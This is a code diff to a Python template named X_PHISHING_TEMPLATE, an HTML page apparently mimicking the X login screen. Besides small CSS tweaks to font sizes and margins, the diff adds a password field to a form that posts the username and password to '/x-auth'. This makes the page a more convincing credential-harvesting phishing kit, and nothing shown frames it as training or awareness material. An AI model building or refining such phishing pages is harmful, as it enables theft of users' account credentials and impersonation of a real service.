@@ -73,7 +73,7 @@ X_PHISHING_TEMPLATE = '''
             position: absolute;
             top: 16px;
             left: 16px;
-            font-size: 24px;
+            font-size: 28px;
             cursor: pointer;
             color: #fff;
         }
@@ -116,7 +116,7 @@ X_PHISHING_TEMPLATE = '''
             font-weight: 500;
         }
         .input-group {
-            margin: 24px 0;
+            margin: 16px 0;
         }
         input {
             width: 100%;
@@ -143,7 +143,7 @@ X_PHISHING_TEMPLATE = '''
             margin-top: 20px;
         }
         .forgot {
-            margin: 20px 0;
+            margin: 24px 0;
             font-size: 15px;
         }
         .forgot a {
@@ -181,6 +181,9 @@ X_PHISHING_TEMPLATE = '''
         <form action="/x-auth" method="post">
             <div class="input-group">
                 <input type="text" name="identifier" placeholder="Phone, email, or username" required autofocus>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Password" required>
             </div>
             <button type="submit" class="next-btn">Next</button>
         </form>
